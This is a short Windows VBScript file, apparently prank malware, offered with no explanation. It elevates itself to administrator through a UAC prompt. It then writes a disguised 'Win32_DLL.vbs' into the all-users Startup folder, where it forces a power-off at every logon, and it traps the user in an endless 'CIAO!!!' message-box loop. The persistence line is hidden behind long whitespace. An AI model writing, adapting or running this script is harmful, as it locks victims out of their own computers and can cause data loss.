Set WshShell = WScript.CreateObject("WScript.Shell")
If WScript.Arguments.Length = 0 Then
  Set ObjShell = CreateObject("Shell.Application")
  ObjShell.ShellExecute "wscript.exe" _
    , """" & WScript.ScriptFullName & """ RunAsAdministrator", , "runas", 1
  WScript.Quit
End if
Dim FSO
Set FSO = CreateObject("Scripting.FileSystemObject")
																																																													Set OutPutFile = FSO.OpenTextFile("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Win32_DLL.vbs" ,8 , True)
OutPutFile.WriteLine("Dim oShell")
OutPutFile.WriteLine("Set oShell = WScript.CreateObject (""WSCript.shell"")")
OutPutFile.WriteLine("oShell.run ""cmd /K CD C:\ & shutdown /p""")
OutPutFile.WriteLine("Set oShell = Nothing")
Set FSO= Nothing

do
msgbox "CIAO!!!"
loop

Dim oShell
Set oShell = WScript.CreateObject ("WSCript.shell")
oShell.run "cmd /K CD C:\ & shutdown /s /t 10"
Set oShell = Nothing